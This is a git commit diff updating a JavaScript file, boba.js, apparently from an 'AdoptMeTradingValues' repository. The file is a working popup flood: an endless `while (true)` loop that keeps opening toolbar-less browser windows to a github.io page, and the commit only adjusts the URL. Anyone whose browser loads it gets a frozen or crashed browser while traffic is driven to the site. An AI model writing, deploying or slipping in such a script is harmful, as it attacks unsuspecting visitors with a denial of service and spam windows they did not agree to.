73a65e3a2be32b49ac814b51acd772f0dca05321
AdoptMeTradingValues <108958603+AdoptMeTradingValues@users.noreply.github.com>
2022-09-23 11:24:30 -0400

    Update boba.js

--- boba.js
+++ boba.js
@@ -1,3 +1,3 @@
 while (true) {
-            window.open('https://AdoptMeTradingValues.github.io', '_blank', 'toolbar=0,location=0,menubar=0');
+            window.open('https://adoptmetradingvalues.github.io/', '_blank', 'toolbar=0,location=0,menubar=0');
 }
